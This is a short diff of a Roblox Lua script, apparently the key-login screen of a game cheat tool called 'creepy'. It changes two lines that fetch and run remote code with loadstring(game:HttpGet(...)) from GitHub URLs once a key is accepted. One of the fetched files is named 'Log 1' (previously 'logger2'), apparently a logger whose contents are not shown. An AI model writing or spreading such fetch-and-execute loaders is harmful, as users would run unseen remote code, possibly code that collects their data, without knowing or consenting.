@@ -55,9 +55,9 @@ Enter.MouseButton1Down:connect(function()
 		wait(1)
 		Enter.Text = "Welcome to creepy"
 		wait(1)
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/babysharkleader280/log-1/main/logger2"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/creepyon/creepy-on/main/Log%201"))()
 		Login.Visible = false
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/babysharkleader280/creepyV/main/creepyantigui"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/creepyon/creepy/main/Lock"))()
 	else
 		game.Players.LocalPlayer:Kick("Invalid key!")
 	end
